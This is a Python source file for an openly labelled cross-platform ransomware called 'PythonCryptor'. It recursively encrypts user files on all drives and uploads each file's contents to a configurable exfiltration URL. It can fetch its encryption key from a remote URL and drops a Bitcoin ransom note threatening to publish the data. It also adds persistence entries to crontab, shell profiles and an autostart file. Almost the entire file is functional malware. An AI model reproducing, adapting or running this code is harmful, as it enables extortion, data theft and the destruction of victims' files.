#!/usr/bin/env python3
# -*- coding: utf-8 -*-

###################
#    This package implements a cross platform RansomWare.
#    Copyright (C) 2021, 2025  Maurice Lambert

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

"""
This package implements a cross platform RansomWare.
"""

__version__ = "1.0.0"
__author__ = "Maurice Lambert"
__author_email__ = "mauricelambert434@gmail.com"
__maintainer__ = "Maurice Lambert"
__maintainer_email__ = "mauricelambert434@gmail.com"
__description__ = """
This package implements a cross platform RansomWare.
"""
__url__ = "https://github.com/mauricelambert/RansomWare"

__all__ = ["RansomWare"]

__license__ = "GPL-3.0 License"
__copyright__ = """
RansomWare  Copyright (C) 2021, 2025  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.
"""
copyright = __copyright__
license = __license__

print(copyright)

from os.path import (
    join,
    isdir,
    isfile,
    abspath,
    getsize,
    dirname,
    basename,
    splitext,
    expanduser,
)
from os import scandir, urandom, access, X_OK, R_OK, W_OK, stat, environ
from base64 import b85decode, b64decode, b32decode, b16decode
from sys import exit, executable, argv, stderr
from ctypes import Structure, sizeof, byref
from urllib.request import urlopen, Request
from stat import FILE_ATTRIBUTE_HIDDEN
from argparse import ArgumentParser
from contextlib import suppress
from _io import _BufferedIOBase
from urllib.parse import quote
from typing import Callable
from platform import system
from string import Template
from fnmatch import fnmatch
from getpass import getuser
from lzma import compress
from time import sleep
from math import log

RC4 = RC6Encryption = RC4Encryption = None

DEFAULT_WALLET = "3LU8wRu4ZnXP4UM8Yo6kkTiGHM9BubgyiG"  # https://crypto.news/fbi-identifies-six-bitcoin-addresses-controlled-by-north-korean-hackers/
PRICE = "0.01"
CRYPTO = "BitCoin"

RANSOM_NOTE = Template(
    """
Dear victim,

We regret to inform you that your files have been securely encrypted by the PythonCryptor. 📁🔒

Data Exfiltration Notice:
During our intrusion, we have successfully extracted sensitive data from your system.
This data is now securely stored on our private servers and will be published if payment is not received.

To regain access to your precious documents, we kindly request a ransom of ${price} ${crypto}. Please send the payment to the following wallet address:
${crypto} Wallet: ${wallet}

Rest assured, once the payment is received, we will promptly provide you with the decryption key and permanently delete the exfiltrated data. Your cooperation in this matter is greatly appreciated !

Please note:
Time is of the essence! You have 48 hours to comply before your files are permanently lost in the digital abyss and your data is publicly disclosed. 😱
We recommend you do not attempt to decrypt the files yourself, as this may lead to further complications (and we wouldn't want that !).

Thank you for your understanding and prompt attention to this matter. We look forward to resolving this situation amicably !

Best regards,
The PythonCryptor.
"""
)

is_windows = system() == "Windows"

if is_windows:
    from ctypes.wintypes import DWORD, WCHAR, WORD, BYTE, LPCWSTR
    from ctypes import windll

    system_directories = [
        "?:\\Drivers",
        "?:\\Program Files",
        "?:\\Program Files (x86)",
        "?:\\Windows",
    ]

    INVALID_FILE_ATTRIBUTES = 0xFFFFFFFF
    FILE_ATTRIBUTE_REPARSE_POINT = 0x0400

    GetFileAttributes = windll.kernel32.GetFileAttributesW
    GetFileAttributes.argtypes = [LPCWSTR]
    GetFileAttributes.restype = DWORD
else:
    system_directories = [
        "/dev/",
        "/proc/",
        "/sys/",
        "*/bin/*",
        "*/sbin/*",
        "/etc/",
        "/lib/",
        "/usr/",
        "/opt/",
        "/boot/",
        "/var/lib/",
        "/var/opt/",
    ]

system_extensions = [
    ".py",
    ".java",
    ".cpp",
    ".js",
    ".php",
    ".sql",
    ".exe",
    ".dll",
    ".sys",
    ".ini",
    ".bat",
    ".com",
    ".obj",
    ".rb",
    ".rbw",
    ".gem",
    ".ru",
    ".pl",
    ".pm",
    ".t",
    ".psgi",
    ".o",
    ".lib",
    ".cof",
    ".plist",
    ".nqp",
    ".raku",
    ".rakumod",
    ".cgi",
    ".wsf",
    ".wsc",
    ".ps1",
    ".psm1",
    ".psd1",
    ".chm",
    ".lua",
    ".tcl",
    ".awk",
    ".sed",
    ".groovy",
    ".scala",
    ".kt",
    ".swift",
    ".go",
    ".rs",
    ".hs",
    ".erl",
    ".ex",
    ".exs",
    ".clj",
    ".fs",
    ".cs",
    ".d",
    ".jl",
    ".dat",
]


def weak_encryption(key: bytes, data: bytes) -> bytes:
    """
    This fonction implements a weak encoding (XOR encryption).
    """

    key_lenght = len(key)
    return bytes([car ^ key[i % key_lenght] for i, car in enumerate(data)])


def rc6_encryption(key: bytes, data: bytes) -> bytes:
    """
    This function implements the encryption with
    RC6Encryption encryption module.
    """

    rc6 = RC6Encryption(key)
    iv, encrypt = rc6.data_encryption_CBC(data)
    return iv + encrypt


def rc4_encryption(key: bytes, data: bytes) -> bytes:
    """
    This function implements the encryption with
    RC4Encryption encryption module.
    """

    rc4 = RC4Encryption(key)
    rc4.make_key()
    cipher = rc4.crypt(data)
    return cipher


def librc4_encryption(key: bytes, data: bytes) -> bytes:
    """
    This function implements the encryption with
    FastRc4 encryption library.
    """

    rc4 = RC4(key)
    cipher = rc4.encrypt(data)
    return cipher


def get_encryption_method() -> Callable:
    """
    This function try to import stronger encryption algorithm.
    """

    global RC6Encryption, RC4Encryption, RC4

    try:
        from RC6Encryption import RC6Encryption
    except ImportError:
        pass
    else:
        return rc6_encryption

    try:
        from RC4Encryption import RC4Encryption
    except ImportError:
        pass
    else:
        return rc4_encryption

    try:
        from librc4 import RC4
    except ImportError:
        pass
    else:
        return librc4_encryption

    return weak_encryption


def shannon_entropy(data: bytes) -> float:
    """
    This function returns the shannon entropy score for data.
    """

    possible = dict(((chr(x), 0) for x in range(0, 256)))
    for byte in data:
        possible[chr(byte)] += 1
    data_len = len(data)
    entropy = 0.0
    for i in possible:
        if possible[i] == 0:
            continue
        p = float(possible[i] / data_len)
        entropy -= p * log(p, 2)
    return entropy


def is_junction(full_path: str) -> bool:
    """
    This function checks if path is a junction.
    """

    attributes = GetFileAttributes(abspath(full_path))
    if attributes == INVALID_FILE_ATTRIBUTES:
        return False
    return bool(attributes & FILE_ATTRIBUTE_REPARSE_POINT)



crypt = get_encryption_method()

if is_windows:
    class OSVERSIONINFOEXW(Structure):
        _fields_ = [
            ("dwOSVersionInfoSize", DWORD),
            ("dwMajorVersion", DWORD),
            ("dwMinorVersion", DWORD),
            ("dwBuildNumber", DWORD),
            ("dwPlatformId", DWORD),
            ("szCSDVersion", WCHAR * 128),
            ("wServicePackMajor", WORD),
            ("wServicePackMinor", WORD),
            ("wSuiteMask", WORD),
            ("wProductType", BYTE),
            ("wReserved", BYTE),
        ]


class RansomWare:
    """
    This class implements the ransomware.
    """

    def __init__(
        self,
        key: bytes,
        url: str = None,
        wallet: str = DEFAULT_WALLET,
        crypto: str = CRYPTO,
        price: str = PRICE,
        interval_time: float = 0,
        encrypt: Callable = crypt,
        get_iv: Callable = lambda: urandom(40),
    ):
        self.windows_server = self.is_windows_server()
        self.drives = self.get_drives()
        self.set_system_drive()

        self.key = key

        self.wallet = wallet
        self.crypto = crypto
        self.price = price

        self.url = url
        self.iv_filename = join(dirname(__file__), "IV.txt")

        self.crypt = encrypt
        self.get_iv = get_iv
        self.interval_time = interval_time

    def get_drives(self):
        """
        This method returns parents path to start recursive functions
        ("/" for Linux and filesystem drives for Windows).
        """

        if not is_windows:
            return ["/"]

        drives = []
        bitmask = windll.kernel32.GetLogicalDrives()
        for letter in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
            if bitmask & 1:
                drives.append(f"{letter}:\\")
            bitmask >>= 1
        return drives

    def set_system_drive(self) -> None:
        """
        This method modify system_directories with Windows system drive.
        """

        global system_directories

        if not is_windows:
            return False

        system_drive = environ["SystemDrive"][0]
        system_directories = [
            system_drive + x[1:]
            for x in system_directories
            if (self.is_windows_server and "Program" not in x)
            or not self.is_windows_server
        ]

    def check_path(self, full_path: str) -> bool:
        """
        This method returns True when data in the path should be
        encrypted or False when it should not.
        """

        if getsize(full_path) > 104857600:
            return False

        if not access(full_path, R_OK | W_OK):
            return False

        if isdir(full_path):
            if is_windows:
                if (
                    stat(full_path).st_file_attributes & FILE_ATTRIBUTE_HIDDEN
                    and full_path != join(
                        environ["SystemDrive"], "ProgramData"
                    )
                ) or is_junction(full_path):
                    return False
            else:
                if basename(full_path).startswith("."):
                    return False
        elif isfile(full_path) and not is_windows and access(full_path, X_OK):
            return False

        for base_path in system_directories:
            if "*" in base_path or "?" in base_path or "[" in base_path:
                if fnmatch(full_path, base_path):
                    return False
                continue

            if full_path.startswith(base_path):
                return False

        if self.iv_filename == full_path:
            return False

        return splitext(full_path)[1] not in system_extensions

    def is_windows_server(self) -> bool:
        """
        This method returns True when the system is a Windows Server.
        """

        if not is_windows:
            return False

        PRODUCT_WORKSTATION = 1
        PRODUCT_SERVER = 3

        os_info = OSVERSIONINFOEXW()
        os_info.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXW)

        retcode = windll.ntdll.RtlGetVersion(byref(os_info))
        if retcode != 0:
            return False

        return os_info.wProductType != PRODUCT_WORKSTATION

    def start(self) -> None:
        """
        This function starts the attack.
        """

        self.write_ransomnote()
        for drive in self.drives:
            self.ransom_recursively(drive)

    def ransom_recursively(self, directory: str) -> None:
        """
        This function get recursive filenames and crypt files.
        """

        for file in scandir(directory):
            full_path = join(directory, file.name)

            if not self.check_path(full_path):
                continue

            if file.is_dir():
                self.ransom_recursively(full_path)

            elif file.is_file():
                with suppress(PermissionError):
                    with open(full_path, "rb+") as file:
                        data = self.exfiltrate_file(file)
                        self.encrypt_file(file, data)

                    if self.interval_time:
                        sleep(self.interval_time)

    def exfiltrate_file(self, file: _BufferedIOBase) -> bytes:
        """
        This function performs exfiltration for one file.
        """

        data = file.read()
        file.seek(0)

        if shannon_entropy(data) < 6.5:
            data = compress(data)

        if self.url is None:
            return data

        urlopen(Request(self.url + "?filename=" + quote(file.name), data=data))

        return data

    def write_ransomnote(self) -> None:
        """
        This method writes the ransomnote.
        """

        if is_windows:
            directory = (
                r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
            )
            files = []
            if not access(directory, W_OK):
                directory = expanduser("~") + (
                    r"\AppData\Roaming\Microsoft\W"
                    r"indows\Start Menu\Programs\Startup"
                )
        else:
            directory = r"/usr/share"
            files = ["/etc/issue"]
            user_directory = expanduser("~")
            if not access(directory, W_OK):
                directory = join(user_directory, ".ransomware")

        ransom = RANSOM_NOTE.safe_substitute(
            crypto=self.crypto, wallet=self.wallet, price=self.price
        )
        files.append(join(directory, "ransomnote.txt"))

        for filename in files:
            with open(filename, "w", encoding="utf-8") as file:
                file.write(ransom)

        if is_windows:
            return None

        command = f"open {filename} || cat {filename}"
        cron = f"\n@reboot {command}\n"
        desktop = (
            "[Desktop Entry]\n"
            "Type=Application\n"
            "Terminal=true\n"
            "Name=PythonCryptor\n"
            f"Exec={command}\n"
        )
        files = {
            "/etc/crontab": cron,
            "/var/spool/cron/crontabs/" + getuser(): cron,
            join(user_directory, ".profile"): command,
            join(user_directory, ".bash_profile"): command,
            join(user_directory, ".config/autostart/.desktop"): desktop,
        }

        for filepath, content in files.items():
            if not access(filepath, W_OK):
                with open(filepath, "a") as file:
                    file.write(content)

    def encrypt_file(self, file: _BufferedIOBase, data: bytes) -> None:
        """
        This function encrypts one file.
        """

        iv = self.get_iv()
        iv_length = len(iv)
        final_key = [x ^ iv[i % iv_length] for i, x in enumerate(self.key)]

        kb = 1024

        if len(data) <= 153600:
            kb_number = 10
        elif len(data) <= 1048576:
            kb_number = 15
        elif len(data) <= 52428800:
            kb_number = 20
        elif len(data) <= 104857600:
            kb_number = 30

        iv_file = open(self.iv_filename, "a")
        iv_file.write(file.name + " " + iv.hex() + "\n")

        index = 0
        data = bytearray(data)
        while index < len(data):
            position = kb * index
            end = position + kb
            new_data = self.crypt(final_key, data[position:end])
            data[position:end] = new_data[-kb:]
            onetime_iv = new_data[:-kb]
            if onetime_iv:
                iv_file.write(file.name + " " + onetime_iv.hex() + "\n")
            index += kb * kb_number

        file.write(data)
        file.truncate()


def parse() -> ArgumentParser:
    """
    This function parses command line arguments.
    """

    arguments = ArgumentParser(
        description="This program implements a ransomware."
    )
    arguments.add_argument(
        "--key",
        "-k",
        default=environ.get("ENCRYPTIONKEY"),
        help=(
            "Key to encrypt files. Can be defined with ENCRYPTIONKEY"
            " environment variables."
        ),
    )
    arguments.add_argument(
        "--urlkey",
        "-l",
        default=environ.get("URLKEY"),
        help=(
            "URL to get the encryption key. Can be defined "
            "with URLKEY environment variables."
        ),
    )
    arguments.add_argument(
        "--url",
        "-u",
        default=environ.get("URLEXFILTRATION"),
        help=(
            "URL to exfiltrate data. Can be defined with "
            "URLEXFILTRATION environment variables."
        ),
    )
    arguments.add_argument(
        "--wallet",
        "-w",
        default=environ.get("WALLET") or DEFAULT_WALLET,
        help=(
            "Wallet to receive the ramsom. Can be defined "
            "with WALLET environment variables."
        ),
    )
    arguments.add_argument(
        "--crypto",
        "-c",
        default=environ.get("CRYPTO") or CRYPTO,
        help=(
            "The cryptocurrency to use for the ransom. Can be "
            "defined with CRYPTO environment variables."
        ),
    )
    arguments.add_argument(
        "--price",
        "-p",
        default=environ.get("PRICE") or PRICE,
        help=(
            "The ransom price. Can be defined with "
            "PRICE environment variables."
        ),
    )
    arguments.add_argument(
        "--encode-key",
        "-e",
        help="Encode key with bases 16, 32, 64 or 85.",
        choices=["16", "32", "64", "85"],
        default=None,
    )
    arguments.add_argument(
        "--interval-time",
        "-t",
        help="Interval time to sleep after file encryption and exfiltration.",
        type=int,
        default=0,
    )
    return arguments.parse_args()


def main() -> int:
    """
    This function is the main function to start
    the program from command line.
    """

    arguments = parse()

    if (not arguments.key and not arguments.urlkey) or (
        arguments.key and arguments.urlkey
    ):
        print(
            (
                "Encryption key or URL key must be defined in arguments"
                " (read help message) or environment variables."
            ),
            file=stderr,
        )
        print(f'Help: "{executable}" "{argv[0]}" --help', file=stderr)
        return 1

    if arguments.urlkey:
        arguments.key = urlopen(arguments.urlkey).read()

    if arguments.encode_key is None:
        key = arguments.key.encode()
    elif arguments.encode_key == "16":
        key = b16decode(arguments.key.encode())
    elif arguments.encode_key == "32":
        key = b32decode(arguments.key.encode())
    elif arguments.encode_key == "64":
        key = b64decode(arguments.key.encode())
    elif arguments.encode_key == "85":
        key = b85decode(arguments.key.encode())

    RansomWare(
        key,
        url=arguments.url,
        wallet=arguments.wallet,
        crypto=arguments.crypto,
        price=arguments.price,
        interval_time=arguments.interval_time,
    ).start()

    return 0


if __name__ == "__main__":
    exit(main())
